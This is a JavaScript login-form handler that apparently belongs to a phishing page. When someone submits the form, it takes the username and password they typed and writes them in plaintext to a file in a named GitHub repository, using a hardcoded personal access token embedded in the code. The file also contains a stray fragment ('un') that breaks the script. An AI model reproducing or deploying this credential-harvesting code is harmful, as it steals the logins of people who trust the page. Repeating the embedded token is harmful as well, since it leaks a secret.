const username = document.querySelector('.username')
const password = document.querySelector('.password')


document.querySelector('.loginButton').addEventListener('click', () => {
  if (username.value ==='' || password.value ==='') {
      console.log('empty');
  }else {
      console.log(username.value, password.value);
      const repoOwner = 'Arnav-lunatic'
      const repoName = 'info'
      const filePath = 'info.txt'
      const githubToken = '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'
      const apiUrl = `https://api.github.com/repos/${repoOwner}/${repoName}/contents/${filePath}`

      const newTextContent = `username - "${username.value}" | password - "${password.value}"`
      un

      const updateFile = async () => {
        try {
           // Fetch the current file content to get the SHA
          const currentFileResponse = await fetch(apiUrl, {
            method: 'GET',
            headers: {
              'Authorization': `token ${githubToken}`,
              'Accept': 'application/vnd.github.v3+json',
            },
          });

          if (currentFileResponse.status !== 200) {
            console.error('Error fetching current file:', currentFileResponse.status, currentFileResponse.statusText);
            return;
          }

          const currentFileData = await currentFileResponse.json();
          const currentFileSha = currentFileData.sha;
          console.log(currentFileSha);

          const response = await fetch(apiUrl, {
            method: 'PUT',
            headers: {
              'Authorization': `token ${githubToken}`,
              'Accept': 'application/vnd.github.v3+json',
            },
            body: JSON.stringify({
              message: 'Update text file',
              content: btoa(newTextContent), // Encode the new text content in base64
              sha: currentFileSha, // You need to fetch the current SHA of the file first
            }),
          });

          if (response.status === 200) {
            console.log('File updated successfully.');
          } else {
            console.error('Error updating file:', response.status, response.statusText);
          }
        } catch (error) {
          console.error('Error updating file:', error);
        }
      };

      // Call the function to update the file
      updateFile();
  }
})